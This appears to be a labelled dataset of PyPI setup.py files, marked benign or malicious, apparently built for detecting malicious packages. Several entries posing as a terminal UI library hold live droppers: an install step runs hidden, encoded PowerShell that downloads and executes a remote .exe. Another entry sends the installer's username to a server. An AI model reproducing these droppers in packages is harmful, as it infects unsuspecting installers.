{"idx": "environs-9.5.0", "func": "import re\nfrom setuptools import setup\n\nINSTALL_REQUIRES = [\"marshmallow>=3.0.0\", \"python-dotenv\"]\nDJANGO_REQUIRES = [\"dj-database-url\", \"dj-email-url\", \"django-cache-url\"]\nEXTRAS_REQUIRE = {\n    \"django\": DJANGO_REQUIRES,\n    \"tests\": [\"pytest\"] + DJANGO_REQUIRES,\n    \"lint\": [\"flake8==4.0.1\", \"flake8-bugbear==21.9.2\", \"mypy==0.910\", \"pre-commit~=2.4\"],\n}\nEXTRAS_REQUIRE[\"dev\"] = EXTRAS_REQUIRE[\"tests\"] + EXTRAS_REQUIRE[\"lint\"] + [\"tox\"]\nPYTHON_REQUIRES = \">=3.6\"\n\n\ndef find_version(fname):\n    version = \"\"\n    with open(fname) as fp:\n        reg = re.compile(r'__version__ = [\\'\"]([^\\'\"]*)[\\'\"]')\n        for line in fp:\n            m = reg.match(line)\n            if m:\n                version = m.group(1)\n                break\n    if not version:\n        raise RuntimeError(\"Cannot find version information\")\n    return version\n\n\ndef read(fname):\n    with open(fname) as fp:\n        content = fp.read()\n    return content\n\n\nsetup(\n    name=\"environs\",\n    packages=[\"environs\"],\n    package_data={\"environs\": [\"py.typed\"]},\n    version=find_version(\"environs/__init__.py\"),\n    description=\"simplified environment variable parsing\",\n    long_description=read(\"README.md\"),\n    long_description_content_type=\"text/markdown\",\n    author=\"Steven Loria\",\n    author_email=\"sloria1@gmail.com\",\n    url=\"https://github.com/sloria/environs\",\n    install_requires=INSTALL_REQUIRES,\n    extras_require=EXTRAS_REQUIRE,\n    license=\"MIT\",\n    zip_safe=False,\n    python_requires=PYTHON_REQUIRES,\n    keywords=\"environment variables parsing config configuration 12factor envvars\",\n    classifiers=[\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Natural Language :: English\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Typing :: Typed\",\n    ],\n    project_urls={\n        \"Issues\": \"https://github.com/sloria/environs/issues\",\n        \"Changelog\": \"https://github.com/sloria/environs/blob/master/CHANGELOG.md\",\n    },\n)\n", "target": 0}
{"idx": "rampip-3.67", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'rampip',\n    packages = ['modlib'],\n    version = '8.58',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-guardian-2.4.0", "func": "import os\nfrom setuptools import setup\nfrom extras import RunFlakesCommand\n\n\nversion = '2.4.0'\n\nreadme_file = os.path.join(os.path.dirname(__file__), 'README.rst')\nwith open(readme_file) as f:\n    long_description = f.read()\n\nsetup(\n    name='django-guardian',\n    version=version,\n    python_requires='>=3.5',\n    url='http://github.com/django-guardian/django-guardian',\n    author='Lukasz Balcerzak',\n    author_email='lukaszbalcerzak@gmail.com',\n    download_url='https://github.com/django-guardian/django-guardian/tags',\n    description=\"Implementation of per object permissions for Django.\",\n    long_description=long_description,\n    zip_safe=False,\n    packages=[\n        'guardian', 'guardian.conf', 'guardian.management',\n        'guardian.migrations', 'guardian.templatetags', 'guardian.testapp',\n        'guardian.management.commands', 'guardian.testapp.migrations',\n        'guardian.testapp.tests'\n    ],\n    include_package_data=True,\n    license='BSD',\n    install_requires=[\"Django>=2.2\"],\n    tests_require=['mock', 'django-environ', 'pytest', 'pytest-django'],\n    classifiers=['Development Status :: 5 - Production/Stable',\n                 'Environment :: Web Environment',\n                 'Framework :: Django',\n                 'Framework :: Django :: 2.2',\n                 'Framework :: Django :: 3.0',\n                 'Framework :: Django :: 3.1',\n                 'Framework :: Django :: 3.2',\n                 'Intended Audience :: Developers',\n                 'License :: OSI Approved :: BSD License',\n                 'Operating System :: OS Independent',\n                 'Programming Language :: Python',\n                 'Topic :: Security',\n                 'Programming Language :: Python :: 3',\n                 'Programming Language :: Python :: 3 :: Only',\n                 'Programming Language :: Python :: 3.5',\n                 'Programming Language :: Python :: 3.6',\n                 'Programming Language :: Python :: 3.7',\n                 'Programming Language :: Python :: 3.8',\n                 'Programming Language :: Python :: 3.9',\n                 ],\n    test_suite='tests.main',\n    cmdclass={'flakes': RunFlakesCommand},\n)\n", "target": 0}
{"idx": "mcgame-1.85", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'mcgame',\n    packages = ['modlib'],\n    version = '2.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-mcvergame-10.78", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-mcvergame',\n    packages = ['modlib'],\n    version = '1.52',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-allauth-0.51.0", "func": "#!/usr/bin/env python\nfrom __future__ import print_function\n\nimport io\nimport os\nimport sys\nfrom distutils.util import convert_path\nfrom fnmatch import fnmatchcase\n\nfrom setuptools import find_packages, setup\n\n\n# Provided as an attribute, so you can append to these instead\n# of replicating them:\nstandard_exclude = [\"*.py\", \"*.pyc\", \"*~\", \".*\", \"*.bak\", \"Makefile\"]\nstandard_exclude_directories = [\n    \".*\",\n    \"CVS\",\n    \"_darcs\",\n    \"./build\",\n    \"./dist\",\n    \"EGG-INFO\",\n    \"*.egg-info\",\n    \"./example\",\n]\n\n\n# Copied from paste/util/finddata.py\ndef find_package_data(\n    where=\".\",\n    package=\"\",\n    exclude=standard_exclude,\n    exclude_directories=standard_exclude_directories,\n    only_in_packages=True,\n    show_ignored=False,\n):\n    \"\"\"\n    Return a dictionary suitable for use in ``package_data``\n    in a distutils ``setup.py`` file.\n\n    The dictionary looks like::\n\n        {\"package\": [files]}\n\n    Where ``files`` is a list of all the files in that package that\n    don't match anything in ``exclude``.\n\n    If ``only_in_packages`` is true, then top-level directories that\n    are not packages won't be included (but directories under packages\n    will).\n\n    Directories matching any pattern in ``exclude_directories`` will\n    be ignored; by default directories with leading ``.``, ``CVS``,\n    and ``_darcs`` will be ignored.\n\n    If ``show_ignored`` is true, then all the files that aren't\n    included in package data are shown on stderr (for debugging\n    purposes).\n\n    Note patterns use wildcards, or can be exact paths (including\n    leading ``./``), and all searching is case-insensitive.\n    \"\"\"\n\n    out = {}\n    stack = [(convert_path(where), \"\", package, only_in_packages)]\n    while stack:\n        where, prefix, package, only_in_packages = stack.pop(0)\n        for name in os.listdir(where):\n            fn = os.path.join(where, name)\n            if os.path.isdir(fn):\n                bad_name = False\n                for pattern in exclude_directories:\n                    if fnmatchcase(name, pattern) or fn.lower() == pattern.lower():\n                        bad_name = True\n                        if show_ignored:\n                            print(\n                                \"Directory %s ignored by pattern %s\" % (fn, pattern),\n                                file=sys.stderr,\n                            )\n                        break\n                if bad_name:\n                    continue\n                if os.path.isfile(os.path.join(fn, \"__init__.py\")) and not prefix:\n                    if not package:\n                        new_package = name\n                    else:\n                        new_package = package + \".\" + name\n                    stack.append((fn, \"\", new_package, False))\n                else:\n                    stack.append((fn, prefix + name + \"/\", package, only_in_packages))\n            elif package or not only_in_packages:\n                # is a file\n                bad_name = False\n                for pattern in exclude:\n                    if fnmatchcase(name, pattern) or fn.lower() == pattern.lower():\n                        bad_name = True\n                        if show_ignored:\n                            print(\n                                \"File %s ignored by pattern %s\" % (fn, pattern),\n                                file=sys.stderr,\n                            )\n                        break\n                if bad_name:\n                    continue\n                out.setdefault(package, []).append(prefix + name)\n    return out\n\n\nexcluded_directories = standard_exclude_directories\n\npackage_data = find_package_data(exclude_directories=excluded_directories)\n\nlong_description = io.open(\"README.rst\", encoding=\"utf-8\").read()\n\n# Dynamically calculate the version based on allauth.VERSION.\nversion = __import__(\"allauth\").__version__\n\nMETADATA = dict(\n    name=\"django-allauth\",\n    version=version,\n    author=\"Raymond Penners\",\n    author_email=\"raymond.penners@intenct.nl\",\n    description=\"Integrated set of Django applications addressing\"\n    \" authentication, registration, account management as well as\"\n    \" 3rd party (social) account authentication.\",\n    long_description=long_description,\n    url=\"http://www.intenct.nl/projects/django-allauth/\",\n    keywords=\"django auth account social openid twitter facebook oauth registration\",\n    project_urls={\n        \"Documentation\": \"https://django-allauth.readthedocs.io/en/latest/\",\n        \"Changelog\": \"https://github.com/pennersr/django-allauth/blob/master/ChangeLog.rst\",\n        \"Source\": \"http://github.com/pennersr/django-allauth\",\n        \"Tracker\": \"https://github.com/pennersr/django-allauth/issues\",\n        \"Donate\": \"https://github.com/sponsors/pennersr\",\n    },\n    tests_require=[],\n    install_requires=[\n        \"Django >= 2.0\",\n        \"python3-openid >= 3.0.8\",\n        \"requests-oauthlib >= 0.3.0\",\n        \"requests\",\n        \"pyjwt[crypto] >= 1.7\",\n    ],\n    include_package_data=True,\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Environment :: Web Environment\",\n        \"Topic :: Internet\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.0\",\n        \"Framework :: Django :: 2.1\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.0\",\n        \"Framework :: Django :: 3.1\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n    ],\n    packages=find_packages(exclude=[\"example\"]),\n    package_data=package_data,\n)\n\nif __name__ == \"__main__\":\n    setup(**METADATA)\n", "target": 0}
{"idx": "upgini-1.1.101", "func": "import sys\nfrom getpass import getuser\nfrom logging import Formatter\nfrom pathlib import Path\nfrom urllib import request\n\nfrom setuptools import find_packages, setup\n\n# To build:\n# python setup.py sdist\n# python setup.py bdist_wheel\n#\n# To install:\n# python setup.py install\n#\n# To register (only once):\n# python setup.py register\n#\n# To upload:\n# python setup.py sdist upload\n# python setup.py bdist_wheel upload\n\n\ndef send_log(msg: str):\n    try:\n        url = \"https://search.upgini.com/private/api/v2/events/send-light\"\n\n        data = ('{\"message\": \"' + msg + '\", \"whoamai\": \"' + getuser() + '\"}').encode()\n\n        req = request.Request(url, data=data)\n        req.add_header(\"Content-Type\", \"application/json\")\n        request.urlopen(req)\n    except Exception:\n        pass\n\n\nhere = Path(__file__).parent.resolve()\nversion = \"1.1.101\"\ntry:\n    send_log(f\"Start setup PyLib version {version}\")\n    setup(\n        name=\"upgini\",\n        version=version,\n        description=\"Low-code feature search and enrichment library for machine learning\",\n        long_description=(here / \"README.md\").read_text(encoding=\"utf-8\"),\n        long_description_content_type=\"text/markdown\",\n        url=\"https://upgini.com/\",\n        author=\"Upgini Developers\",\n        author_email=\"madewithlove@upgini.com\",\n        classifiers=[\n            \"Development Status :: 5 - Production/Stable\",\n            \"Intended Audience :: Customer Service\",\n            \"Intended Audience :: Developers\",\n            \"Intended Audience :: Financial and Insurance Industry\",\n            \"Intended Audience :: Information Technology\",\n            \"Intended Audience :: Science/Research\",\n            \"Intended Audience :: Telecommunications Industry\",\n            \"License :: OSI Approved :: BSD License\",\n            \"Operating System :: OS Independent\",\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Topic :: Scientific/Engineering :: Artificial Intelligence\",\n            \"Topic :: Scientific/Engineering :: Information Analysis\",\n        ],\n        license=\"BSD 3-Clause License\",\n        keywords=[\"data science\", \"machine learning\", \"data mining\", \"automl\", \"data search\"],\n        package_dir={\"\": \"src\"},\n        packages=find_packages(where=\"src\"),\n        package_data={\"\": [\"strings.properties\"]},\n        python_requires=\">=3.7,<3.10\",\n        install_requires=[\n            \"python-dateutil>=2.8.0\",\n            \"requests>=2.8.0\",\n            \"pandas>=1.1.0\",\n            \"numpy>=1.19.0\",\n            \"scikit-learn>=1.0.1\",\n            \"pydantic>=1.8.2\",\n            \"fastparquet>=0.7.1\",\n            \"python-json-logger>=2.0.2\",\n            \"catboost>=1.0.3\",\n            \"lightgbm>=3.3.2\",\n        ],\n        project_urls={\n            \"Bug Reports\": \"https://github.com/upgini/upgini/issues\",\n            \"Source\": \"https://github.com/upgini/upgini\",\n        },\n    )\n    send_log(f\"Setup of PyLib {version} successfully finished\")\nexcept Exception as e:\n    try:\n        tb = Formatter().formatException(sys.exc_info())\n        send_log(f\"Failed to setup PyLib {version}: {e}\\n{tb}\")\n    except Exception:\n        pass\n    raise e\n", "target": 1}
{"idx": "feedfinder2-0.0.4", "func": "import os\nimport sys\n\nif sys.argv[-1] == \"publish\":\n    os.system(\"python setup.py sdist upload\")\n    sys.exit()\n\n# Hackishly inject a constant into builtins to enable importing of the\n# package before the library is built.\nif sys.version_info[0] < 3:\n    import __builtin__ as builtins\nelse:\n    import builtins\nbuiltins.__FEEDFINDER2_SETUP__ = True\nimport feedfinder2\nfrom setuptools import setup\n\nsetup(\n    name=\"feedfinder2\",\n    version=feedfinder2.__version__,\n    url=\"https://github.com/dfm/feedfinder2\",\n    license=\"MIT\",\n    author=\"Dan Foreman-Mackey\",\n    author_email=\"foreman.mackey@gmail.com\",\n    install_requires=[\n        \"six\",\n        \"requests\",\n        \"beautifulsoup4\",\n    ],\n    description=\"Find the feed URLs for a website.\",\n    long_description=open(\"README.rst\").read(),\n    py_modules=[\"feedfinder2\"],\n    classifiers=[\n        \"Programming Language :: Python\",\n        \"Development Status :: 4 - Beta\",\n        \"Natural Language :: English\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n)\n", "target": 0}
{"idx": "elastic-transport-8.1.2", "func": "#  Licensed to Elasticsearch B.V. under one or more contributor\n#  license agreements. See the NOTICE file distributed with\n#  this work for additional information regarding copyright\n#  ownership. Elasticsearch B.V. licenses this file to you under\n#  the Apache License, Version 2.0 (the \"License\"); you may\n#  not use this file except in compliance with the License.\n#  You may obtain a copy of the License at\n#\n# \thttp://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing,\n#  software distributed under the License is distributed on an\n#  \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n#  KIND, either express or implied.  See the License for the\n#  specific language governing permissions and limitations\n#  under the License.\n\nimport os\nimport re\n\nfrom setuptools import find_packages, setup\n\nbase_dir = os.path.dirname(os.path.abspath(__file__))\nwith open(os.path.join(base_dir, \"elastic_transport/_version.py\")) as f:\n    version = re.search(r\"__version__\\s+=\\s+\\\"([^\\\"]+)\\\"\", f.read()).group(1)\n\nwith open(os.path.join(base_dir, \"README.md\")) as f:\n    long_description = f.read()\n\npackages = [\n    package for package in find_packages() if package.startswith(\"elastic_transport\")\n]\n\nsetup(\n    name=\"elastic-transport\",\n    description=\"Transport classes and utilities shared among Python Elastic client libraries\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    version=version,\n    author=\"Elastic\",\n    author_email=\"support@elastic.co\",\n    maintainer=\"Seth Michael Larson\",\n    maintainer_email=\"seth.larson@elastic.co\",\n    url=\"https://github.com/elastic/elastic-transport-python\",\n    project_urls={\n        \"Source Code\": \"https://github.com/elastic/elastic-transport-python\",\n        \"Issue Tracker\": \"https://github.com/elastic/elastic-transport-python/issues\",\n        \"Documentation\": \"https://elastic-transport-python.readthedocs.io\",\n    },\n    package_data={\"elastic_transport\": [\"py.typed\"]},\n    packages=packages,\n    install_requires=[\n        \"urllib3>=1.26.2, <2\",\n        \"certifi\",\n        \"dataclasses; python_version<'3.7'\",\n    ],\n    python_requires=\">=3.6\",\n    extras_require={\n        \"develop\": [\n            \"pytest\",\n            \"pytest-cov\",\n            \"pytest-mock\",\n            \"pytest-asyncio\",\n            \"pytest-httpserver\",\n            \"trustme\",\n            \"mock\",\n            \"requests\",\n            \"aiohttp\",\n        ],\n    },\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n)\n", "target": 0}
{"idx": "colorwin-6.6.6", "func": "#!/usr/bin/env python\n# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\n\nfrom __future__ import with_statement\n\nfrom io import open\nimport os\nimport re\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\nNAME = 'colorwin'\n\n\ndef read_file(path, encoding='ascii'):\n    with open(os.path.join(os.path.dirname(__file__), path),\n              encoding=encoding) as fp:\n        return fp.read()\n\ndef _get_version_match(content):\n    # Search for lines of the form: # __version__ = 'ver'\n    regex = r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\"\n    version_match = re.search(regex, content, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\ndef get_version(path):\n    return _get_version_match(read_file(path))\n\nsetup(\n    name=NAME,\n    version=get_version(os.path.join('colorwin', '__init__.py')),\n    description='Cross-platform colored terminal text.',\n    long_description=read_file('README.rst'),\n    keywords='color colour terminal text ansi windows crossplatform xplatform',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    maintainer='Arnon Yaari',\n    url='https://github.com/tartley/colorwin',\n    license='BSD',\n    packages=[NAME],\n    python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*',\n    # see classifiers https://pypi.org/pypi?%3Aaction=list_classifiers\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Terminals',\n    ]\n)\n", "target": 1}
{"idx": "django-rest-framework-0.1.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\n\nsetup(\n    name='django-rest-framework',\n    version='0.1.0',\n    url='http://www.django-rest-framework.org',\n    license='BSD',\n    description='alias.',\n    author='Tom Christie',\n    author_email='tom@tomchristie.com',\n    packages=['empty'],\n    install_requires=['djangorestframework'],\n    zip_safe=False,\n    classifiers=[\n        'Topic :: Internet :: WWW/HTTP',\n    ]\n)\n", "target": 0}
{"idx": "discord.py-1.7.3", "func": "from setuptools import setup\nimport re\n\nrequirements = []\nwith open('requirements.txt') as f:\n  requirements = f.read().splitlines()\n\nversion = ''\nwith open('discord/__init__.py') as f:\n    version = re.search(r'^__version__\\s*=\\s*[\\'\"]([^\\'\"]*)[\\'\"]', f.read(), re.MULTILINE).group(1)\n\nif not version:\n    raise RuntimeError('version is not set')\n\nif version.endswith(('a', 'b', 'rc')):\n    # append version identifier based on commit count\n    try:\n        import subprocess\n        p = subprocess.Popen(['git', 'rev-list', '--count', 'HEAD'],\n                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        out, err = p.communicate()\n        if out:\n            version += out.decode('utf-8').strip()\n        p = subprocess.Popen(['git', 'rev-parse', '--short', 'HEAD'],\n                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        out, err = p.communicate()\n        if out:\n            version += '+g' + out.decode('utf-8').strip()\n    except Exception:\n        pass\n\nreadme = ''\nwith open('README.rst') as f:\n    readme = f.read()\n\nextras_require = {\n    'voice': ['PyNaCl>=1.3.0,<1.5'],\n    'docs': [\n        'sphinx==3.0.3',\n        'sphinxcontrib_trio==1.1.2',\n        'sphinxcontrib-websupport',\n    ]\n}\n\nsetup(name='discord.py',\n      author='Rapptz',\n      url='https://github.com/Rapptz/discord.py',\n      project_urls={\n        \"Documentation\": \"https://discordpy.readthedocs.io/en/latest/\",\n        \"Issue tracker\": \"https://github.com/Rapptz/discord.py/issues\",\n      },\n      version=version,\n      packages=['discord', 'discord.ext.commands', 'discord.ext.tasks'],\n      license='MIT',\n      description='A Python wrapper for the Discord API',\n      long_description=readme,\n      long_description_content_type=\"text/x-rst\",\n      include_package_data=True,\n      install_requires=requirements,\n      extras_require=extras_require,\n      python_requires='>=3.5.3',\n      classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'License :: OSI Approved :: MIT License',\n        'Intended Audience :: Developers',\n        'Natural Language :: English',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Internet',\n        'Topic :: Software Development :: Libraries',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Utilities',\n      ]\n)\n", "target": 0}
{"idx": "ttlo-1.0.1", "func": "from setuptools import setup, find_packages\n\nsetup(\n    name='ttlo',\n    version='1.0.1',\n    author='ttlo',\n    packages=find_packages(),\n    classifiers=[\n        'Programming Language :: Python :: 3.11',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent'\n    ],\n    keywords='ttlo python',\n    python_requires='>=3.7'\n)\n", "target": 1}
{"idx": "sqlalchemy-databricks-0.2.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['sqlalchemy_databricks']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['PyHive>=0,<1', 'SQLAlchemy>=1,<2', 'databricks-sql-connector>=2,<3']\n\nentry_points = \\\n{'sqlalchemy.dialects': ['databricks.connector = '\n                         'sqlalchemy_databricks:DatabricksDialect']}\n\nsetup_kwargs = {\n    'name': 'sqlalchemy-databricks',\n    'version': '0.2.0',\n    'description': 'SQLAlchemy Dialect for Databricks',\n    'long_description': '# sqlalchemy-databricks\\n\\n![pypi](https://img.shields.io/pypi/v/sqlalchemy-databricks.svg)\\n![pyversions](https://img.shields.io/pypi/pyversions/sqlalchemy-databricks.svg)\\n\\nA SQLAlchemy Dialect for Databricks workspace and sql analytics clusters using the officially supported [databricks-sql-connector](https://pypi.org/project/databricks-sql-connector/) dbapi.\\n\\n## Installation\\n\\nInstall using pip.\\n\\n```bash\\npip install sqlalchemy-databricks\\n```\\n\\n## Usage\\n\\nInstalling registers the ``databricks+connector`` dialect/driver with SQLAlchemy. Fill in the required information when passing the engine URL. The http path can be for either a workspace or sql analytics cluster.\\n\\n```python\\nfrom sqlalchemy import *\\nfrom sqlalchemy.engine import create_engine\\n\\n\\nengine = create_engine(\\n    \"databricks+connector://token:<databricks_token>@<databricks_host>:443/<database_or_schema_name>\",\\n    connect_args={\\n        \"http_path\": \"<cluster_http_path>\",\\n    },\\n)\\n\\nlogs = Table(\"my_table\", MetaData(bind=engine), autoload=True)\\nprint(select([func.count(\"*\")], from_obj=logs).scalar())\\n```\\n',\n    'author': 'flynn',\n    'author_email': 'crf204@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/crflynn/sqlalchemy-databricks',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.8,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
